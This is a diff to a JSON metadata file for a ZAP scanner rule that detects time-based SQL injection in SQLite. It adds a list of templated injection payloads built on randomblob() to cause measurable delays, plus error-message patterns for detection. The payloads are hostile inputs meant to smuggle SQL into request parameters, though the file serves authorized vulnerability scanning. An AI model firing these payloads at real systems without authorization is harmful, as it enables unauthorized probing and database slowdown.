@@ -14,8 +14,40 @@
     "OWASP_2017_A01": "",
     "WSTG_V42_INPV_05_SQLI": ""
   },
-  "payloads": [],
-  "patterns": [],
+  "payloads": [
+    "case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+    "' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | '",
+    "\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | \"",
+    "case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+    "' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end ",
+    "\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end ",
+    "<<<<ORIGINALVALUE>>>> * case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+    "<<<<ORIGINALVALUE>>>>' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | '",
+    "<<<<ORIGINALVALUE>>>>\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | \"",
+    "<<<<ORIGINALVALUE>>>> * case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+    "<<<<ORIGINALVALUE>>>>' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end ",
+    "<<<<ORIGINALVALUE>>>>\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end "
+  ],
+  "patterns": [
+    "no such function: randomblob",
+    "near \\\".+\\\": syntax error"
+  ],
+  "all_arrays": {
+    "SQL_SQLITE_TIME_REPLACEMENTS": [
+      "case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+      "' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | '",
+      "\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | \"",
+      "case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+      "' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end ",
+      "\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end ",
+      "<<<<ORIGINALVALUE>>>> * case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+      "<<<<ORIGINALVALUE>>>>' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | '",
+      "<<<<ORIGINALVALUE>>>>\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end | \"",
+      "<<<<ORIGINALVALUE>>>> * case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then 1 else 1 end ",
+      "<<<<ORIGINALVALUE>>>>' | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end ",
+      "<<<<ORIGINALVALUE>>>>\" | case randomblob(<<<<NUMBLOBBYTES>>>>) when not null then \"\" else \"\" end "
+    ]
+  },
   "raw_class": "org.zaproxy.zap.extension.ascanrulesAlpha.SqlInjectionSqLiteTimingScanRule",
   "passive": false
 }
